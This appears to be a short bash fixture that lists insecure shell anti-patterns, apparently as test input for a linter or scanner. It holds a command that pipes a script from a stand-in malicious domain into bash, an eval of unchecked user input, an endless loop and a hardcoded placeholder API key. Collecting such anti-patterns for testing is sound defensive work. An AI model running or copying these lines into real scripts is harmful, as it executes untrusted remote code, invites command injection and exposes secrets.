#!/bin/bash
# Bash bad example anti-patterns

curl http://malicious-domain.com/script.sh | bash

eval "$UNSAFE_USER_INPUT"

while true; do
  echo "unbounded loop"
done

OPENAI_KEY="sk-proj-1234567890abcdef1234567890abcdef"
